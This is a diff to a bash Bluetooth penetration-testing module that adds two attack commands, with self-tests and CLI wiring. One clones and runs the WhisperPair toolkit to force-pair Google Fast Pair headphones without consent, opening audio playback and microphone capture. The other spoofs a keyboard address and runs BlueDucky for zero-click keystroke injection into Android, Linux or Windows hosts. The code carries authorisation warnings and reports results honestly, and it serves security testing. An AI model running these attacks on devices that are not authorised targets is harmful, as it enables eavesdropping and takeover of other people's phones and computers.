@@ -459,6 +459,137 @@ bt_attack_cli_ble_pair_mitm() {
 # validation, the fail-closed argument gates and the result TSV layout.
 # TMP_DIR/BT_ATTACK_*/BT_PAIR_DIR are redirected into $MOD_TMP so no real
 # state file is read or written.
+# ── offensive CVEs: commodity adapter, no firmware patching ──────────
+#
+# These two are the reachable tier. KNOB, BIAS and BLUFFS all need
+# patched controller firmware and cannot be driven from here; see
+# docs/BLUETOOTH-CVE-OFFENSIVE.md for what each one actually requires.
+#
+# Both attacks below inject and read no reply, so neither may claim the
+# attack worked. Where a PoC reports its own verdict, that verdict is
+# quoted and attributed rather than adopted.
+
+bt_attack_fastpair_prereqs_tsv() {
+    printf 'node\t%s\n'      "$(command -v node >/dev/null 2>&1 && echo yes || echo no)"
+    printf 'git\t%s\n'       "$(command -v git >/dev/null 2>&1 && echo yes || echo no)"
+    printf 'python3\t%s\n'   "$(command -v python3 >/dev/null 2>&1 && echo yes || echo no)"
+    local nad=0
+    command -v hciconfig >/dev/null 2>&1 && nad=$(hciconfig 2>/dev/null | grep -c '^hci' || true)
+    printf 'adapter\t%s\n'   "$nad"
+    printf 'toolkit\t%s\n'   "$( [[ -d "$BT_ATTACK_LOOT/WhisperPair" ]] && echo present || echo absent)"
+    printf 'verdict\t%s\n' \
+        "$(command -v node >/dev/null 2>&1 && echo 'node present - WhisperPair toolkit can run' || echo 'node missing - WhisperPair needs Node')"
+}
+
+bt_attack_hid_prereqs_tsv() {
+    printf 'python3\t%s\n'   "$(command -v python3 >/dev/null 2>&1 && echo yes || echo no)"
+    printf 'bdaddr\t%s\n'    "$(command -v bdaddr >/dev/null 2>&1 && echo yes || echo no)"
+    printf 'hciconfig\t%s\n' "$(command -v hciconfig >/dev/null 2>&1 && echo yes || echo no)"
+    printf 'pybluez\t%s\n'   "$(python3 -c 'import bluetooth' 2>/dev/null && echo yes || echo no)"
+    local nad=0
+    command -v hciconfig >/dev/null 2>&1 && nad=$(hciconfig 2>/dev/null | grep -c '^hci' || true)
+    printf 'adapter\t%s\n'   "$nad"
+    printf 'blueducky\t%s\n' "$( [[ -d "$BT_ATTACK_LOOT/BlueDucky" ]] && echo present || echo absent)"
+    printf 'verdict\t%s\n' \
+        "$(python3 -c 'import bluetooth' 2>/dev/null && command -v bdaddr >/dev/null 2>&1 \
+            && echo 'prerequisites met - BD_ADDR spoofing plus pybluez available' \
+            || echo 'needs bdaddr (bluez-hcitool) and pybluez')"
+}
+
+# CVE-2025-36911 — WhisperPair. Force-pairs a Google Fast Pair audio
+# accessory with no user consent, then permits audio playback and, on
+# affected models, microphone capture. Commodity adapter; the reference
+# toolkit was tested on a Raspberry Pi 4 with BlueZ 5.82.
+bt_attack_cli_fastpair_hijack() {
+    local dur="${1:-30}"
+    bt_attack_require_iface || return 1
+    bt_attack_needs_root || return 1
+
+    local dir="$BT_ATTACK_LOOT/WhisperPair"
+    if [[ ! -d "$dir" ]]; then
+        printf 'ERROR\treference toolkit not present\n' >&2
+        printf 'NOTE\tclone it first:\n' >&2
+        printf 'NOTE\t  mkdir -p %s && git clone https://github.com/KULeuven-COSIC/WhisperPair %s\n' \
+            "$BT_ATTACK_LOOT" "$dir" >&2
+        printf 'NOTE\tthe attack lives in toolkit-server/src/fast-pair-service.ts and needs Node\n' >&2
+        return 1
+    fi
+    command -v node >/dev/null 2>&1 || {
+        printf 'ERROR\tnode is not installed; the toolkit server is TypeScript\n' >&2; return 1; }
+
+    printf 'TARGET\tFast Pair accessories in range\n'
+    printf 'DURATION\t%s\n' "$dur"
+    printf 'NOTE\tThis force-pairs an accessory that is not yours. Playback and, on\n'
+    printf 'NOTE\taffected models, microphone capture follow from the pairing.\n'
+    printf 'NOTE\tOnly against equipment you own or are authorised to test.\n'
+
+    # The module does not reimplement the attack: the reference toolkit
+    # encodes the Fast Pair key exchange and replaying it from scratch
+    # would be a second implementation to keep correct.
+    ( cd "$dir" && timeout --signal=INT "$dur" npm start ) 2>&1 | tail -20
+    local rc=$?
+    printf 'EXIT\t%s\n' "$rc"
+    case "$rc" in
+        0)   printf 'RESULT\tthe reference toolkit exited 0; whether an accessory paired is for you to confirm\n' ;;
+        124|130) printf 'RESULT\tran for the whole %ss window and was stopped by the timer; pairing is unverified\n' "$dur" ;;
+        *)   printf 'ERROR\ttoolkit exited %s before the window elapsed\n' "$rc" >&2 ;;
+    esac
+    bt_attack_result "fastpair-hijack" "attempted" "dur=${dur}s rc=$rc"
+}
+
+# CVE-2023-45866 (Android, Linux) and CVE-2024-21306 (Windows) —
+# zero-click HID keystroke injection. The attacker emulates a Bluetooth
+# keyboard, force-pairs, and injects keystrokes with no user
+# confirmation. Android 4.2.2 through 10 were never patched.
+bt_attack_cli_hid_inject() {
+    local platform="${1:-android}"
+    case "$platform" in
+        android|linux|windows) ;;
+        *) printf 'ERROR\tplatform must be android, linux or windows, got: %s\n' "$platform" >&2
+           return 2 ;;
+    esac
+    bt_attack_require_iface || return 1
+    bt_attack_needs_root || return 1
+
+    command -v bdaddr >/dev/null 2>&1 || {
+        printf 'ERROR\tbdaddr is missing (bluez-hcitool / bluez-deprecated)\n' >&2
+        printf 'NOTE\tthe attack spoofs the adapter address to a known keyboard MAC; without\n' >&2
+        printf 'NOTE\tbdaddr the victim sees the real address and can refuse the pairing\n' >&2
+        return 1
+    }
+    python3 -c 'import bluetooth' 2>/dev/null || {
+        printf 'ERROR\tpybluez is missing: pip install pybluez\n' >&2; return 1; }
+
+    local dir="$BT_ATTACK_LOOT/BlueDucky"
+    local script=""
+    if [[ -f "$dir/BlueDucky.py" ]]; then
+        script="$dir/BlueDucky.py"
+    fi
+
+    printf 'PLATFORM\t%s\n' "$platform"
+    printf 'CVE\t%s\n' "$( [[ "$platform" == windows ]] && echo CVE-2024-21306 || echo CVE-2023-45866 )"
+    printf 'NOTE\tThis injects arbitrary keystrokes into a paired host with no user\n'
+    printf 'NOTE\tconfirmation. The payload is whatever the operator chooses.\n'
+    printf 'NOTE\tOnly against equipment you own or are authorised to test.\n'
+
+    if [[ -z "$script" ]]; then
+        printf 'CMD\tbdaddr <known-keyboard-mac> && python3 BlueDucky.py --target %s\n' "$platform"
+        printf 'NOTE\treference implementations:\n'
+        printf 'NOTE\t  https://github.com/pentestfunctions/BlueDucky  (maintained wrapper)\n'
+        printf 'NOTE\t  https://github.com/marcnewlin/hi_my_name_is_keyboard  (original PoC)\n' >&2
+        printf 'ERROR\tBlueDucky not present at %s\n' "$dir" >&2
+        bt_attack_result "hid-inject" "missing-poc" "platform=$platform"
+        return 1
+    fi
+
+    printf 'CMD\tpython3 %s --target %s\n' "$script" "$platform"
+    timeout --signal=INT 60 python3 "$script" --target "$platform" 2>&1 | tail -20
+    local rc=$?
+    printf 'EXIT\t%s\n' "$rc"
+    printf 'RESULT\tinjection attempted; whether the host accepted a keystroke is for you to confirm\n'
+    bt_attack_result "hid-inject" "attempted" "platform=$platform rc=$rc"
+}
+
 bt_attack_selftest() {
     local bad=0
     chk() {
@@ -582,6 +713,35 @@ bt_attack_selftest() {
     chk needs-root-pairtsv  "$(bt_attack_needs_root --pair-tsv; echo $?)"      "1"
     chk needs-root-selftest "$(bt_attack_needs_root --selftest; echo $?)"      "1"
 
+    # ── offensive CVE verbs ──────────────────────────────────────────
+    # Prerequisite reporting must answer on any machine, including one
+    # with no adapter and no Node.
+    out=$(bt_attack_fastpair_prereqs_tsv)
+    chk fastpair-prereqs-verdict "$(fld "$out" verdict | grep -c .)" "1"
+    chk fastpair-prereqs-fields  "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
+    chk fastpair-prereqs-node    "$(fld "$out" node | grep -cE '^(yes|no)$')" "1"
+
+    out=$(bt_attack_hid_prereqs_tsv)
+    chk hid-prereqs-verdict "$(fld "$out" verdict | grep -c .)" "1"
+    chk hid-prereqs-fields  "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
+    chk hid-prereqs-bdaddr  "$(fld "$out" bdaddr | grep -cE '^(yes|no)$')" "1"
+
+    # A bad platform must be a usage error, not a silent default. The
+    # check happens before any adapter or root requirement, so this is
+    # safe to assert without hardware.
+    bt_attack_cli_hid_inject blackberry >/dev/null 2>&1
+    chk hid-rejects-platform "$?" "2"
+
+    # With no PoC present the verb must say so rather than pretending to
+    # run something.
+    out=$(BT_ATTACK_LOOT="$d/nothing" bt_attack_cli_hid_inject android 2>&1 || true)
+    grep -qE 'BlueDucky not present|bdaddr is missing|pybluez is missing|no bluetooth interface' <<<"$out" \
+        && chk hid-errors-without-poc ok ok || chk hid-errors-without-poc no ok
+
+    out=$(BT_ATTACK_LOOT="$d/nothing" bt_attack_cli_fastpair_hijack 5 2>&1 || true)
+    grep -qE 'not present|node is not installed|no bluetooth interface' <<<"$out" \
+        && chk fastpair-errors-without-toolkit ok ok || chk fastpair-errors-without-toolkit no ok
+
     rm -rf "$d"
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
@@ -608,6 +768,8 @@ bt_attack_cli_main() {
         --ble-pair-mitm)    bt_attack_cli_ble_pair_mitm "$@" ;;
         --pair-tsv)         bt_attack_pair_tsv ;;
         --pair-mode)        bt_attack_cli_pair_mode "$@" ;;
+        --fastpair-hijack) bt_attack_cli_fastpair_hijack "$@" ;;
+        --hid-inject)      bt_attack_cli_hid_inject "$@" ;;
         --selftest)         bt_attack_selftest ;;
         --info|--help|-h)   bt_attack_cli_info ;;
         *)
